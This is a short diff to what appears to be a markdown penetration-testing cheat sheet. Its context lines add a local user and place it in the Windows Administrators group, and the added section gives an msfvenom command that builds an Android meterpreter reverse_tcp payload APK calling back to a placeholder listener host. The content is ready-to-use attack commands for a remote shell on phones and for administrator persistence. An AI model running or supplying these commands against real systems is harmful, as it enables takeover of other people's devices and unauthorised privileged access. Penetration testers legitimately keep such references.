@@ -198,7 +198,11 @@ net user Test /Add
 net localgroup Administrators Test /Add
 ```
 
+### Generate payload for Android and encode using msfvenom
 
+```sh
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=[LOCAL HOST] R > payload.apk
+```
 
 [<- Back to index](README.md)
 
